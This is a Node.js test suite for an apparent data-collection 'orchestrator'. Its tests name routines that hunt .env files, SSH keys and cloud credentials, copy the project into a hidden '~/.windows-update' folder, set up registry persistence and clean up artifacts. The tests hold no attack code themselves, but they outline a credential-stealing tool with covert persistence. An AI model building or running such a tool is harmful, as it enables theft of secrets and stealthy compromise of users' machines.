const { describe, it, mock, after } = require("node:test");
const assert = require("node:assert/strict");
const path = require("path");
const os = require("os");
const fs = require("fs");
const childProcess = require("child_process");

let orchestrator;
function loadOrchestrator() {
    const mod = require.resolve("../src/app/orchestrator");
    const persistMod = require.resolve("../src/system/persist");
    delete require.cache[mod];
    delete require.cache[persistMod];
    return require("../src/app/orchestrator");
}

describe("orchestrator — collectSystemData", () => {
    it("returns object with all collector keys", async () => {
        orchestrator = loadOrchestrator();
        const data = await orchestrator.collectSystemData();
        assert.ok(typeof data.system === "object");
        assert.ok(typeof data.cpu === "object");
        assert.ok(typeof data.memory === "object");
        assert.ok(typeof data.user === "object");
        assert.ok(typeof data.environmentVariables === "object");
        assert.ok(Array.isArray(data.wifi));
        assert.ok(Array.isArray(data.software));
        assert.ok(Array.isArray(data.processes));
    });

    it("gracefully handles collector failures", async () => {
        orchestrator = loadOrchestrator();
        const data = await orchestrator.collectSystemData();
        assert.notEqual(data.system, undefined);
    });
});

describe("orchestrator — huntEnvFiles", () => {
    it("returns targets, totalFound, and files array", () => {
        orchestrator = loadOrchestrator();
        const result = orchestrator.huntEnvFiles();
        assert.ok(Array.isArray(result.targets));
        assert.equal(typeof result.totalFound, "number");
        assert.ok(Array.isArray(result.files));
    });
});

describe("orchestrator — huntSecretFiles", () => {
    it("returns sshKeys, cloudCreds, totalFound, files", () => {
        orchestrator = loadOrchestrator();
        const result = orchestrator.huntSecretFiles();
        assert.ok(Array.isArray(result.sshKeys));
        assert.ok(Array.isArray(result.cloudCreds));
        assert.equal(typeof result.totalFound, "number");
        assert.ok(Array.isArray(result.files));
    });
});

describe("orchestrator — performCrudOperations", () => {
    after(() => {
        mock.restoreAll();
    });

    it("skips all operations in dry-run mode", () => {
        orchestrator = loadOrchestrator();
        const log = orchestrator.performCrudOperations("/fake", true);
        assert.ok(log.some(e => e.operation === "DRY_RUN"));
    });

    it("includes copy operations on first run", () => {
        const hiddenDir = path.join(os.homedir(), ".windows-update");
        mock.method(fs, "existsSync", (p) => {
            if (typeof p !== "string") return false;
            if (p === hiddenDir) return false;
            if (p.endsWith("package.json") || p.endsWith("README.md")) return true;
            return false;
        });
        mock.method(fs, "mkdirSync", () => {});
        mock.method(fs, "readdirSync", () => []);
        mock.method(childProcess, "execSync", () => "");
        orchestrator = loadOrchestrator();
        const log = orchestrator.performCrudOperations(process.cwd(), false);
        assert.ok(log.some(e => e.operation === "COPY_PROJECT"));
        assert.ok(log.some(e => e.operation === "PERSIST_REGISTRY"));
    });

    it("skips copy on subsequent runs", () => {
        const hiddenDir = path.join(os.homedir(), ".windows-update");
        mock.method(fs, "existsSync", (p) => {
            if (typeof p !== "string") return false;
            if (p === hiddenDir) return true;
            return false;
        });
        mock.method(childProcess, "execSync", () => "");
        orchestrator = loadOrchestrator();
        const log = orchestrator.performCrudOperations("/fake", false);
        assert.ok(log.some(e => e.operation === "SKIP_COPY"));
    });
});

describe("orchestrator — buildReport", () => {
    const emptyEnv = { targets: [], totalFound: 0, files: [] };
    const emptySecret = { sshKeys: [], cloudCreds: [], totalFound: 0, files: [] };

    it("includes timestamp, runtime, and provided data", () => {
        orchestrator = loadOrchestrator();
        const report = orchestrator.buildReport(
            { system: { hostname: "test" } },
            emptyEnv,
            emptySecret,
            [],
            1000,
            []
        );
        assert.ok(report.timestamp);
        assert.ok(report.runtime);
        assert.equal(report.system.hostname, "test");
        assert.equal(report.systemId, null);
    });

    it("includes foundSecretFiles in report", () => {
        orchestrator = loadOrchestrator();
        const report = orchestrator.buildReport({}, emptyEnv, emptySecret, [], 1000);
        assert.ok(report.foundSecretFiles);
        assert.equal(report.foundSecretFiles.totalFound, 0);
    });

    it("includes errors array when non-empty", () => {
        orchestrator = loadOrchestrator();
        const report = orchestrator.buildReport({}, emptyEnv, emptySecret, [], 1000, ["phase 1 failed"]);
        assert.ok(Array.isArray(report.errors));
        assert.equal(report.errors[0], "phase 1 failed");
    });

    it("omits errors key when no errors", () => {
        orchestrator = loadOrchestrator();
        const report = orchestrator.buildReport({}, emptyEnv, emptySecret, [], 1000);
        assert.equal(report.errors, undefined);
    });

    it("includes crudOperations array", () => {
        orchestrator = loadOrchestrator();
        const report = orchestrator.buildReport({}, emptyEnv, emptySecret, [{ operation: "TEST", status: "OK" }], 1000);
        assert.equal(report.crudOperations.length, 1);
        assert.equal(report.crudOperations[0].operation, "TEST");
    });
});

describe("orchestrator — cleanupArtifacts", () => {
    it("returns array of cleanup results", () => {
        orchestrator = loadOrchestrator();
        const results = orchestrator.cleanupArtifacts();
        assert.ok(Array.isArray(results));
        assert.ok(results.length > 0);
    });
});
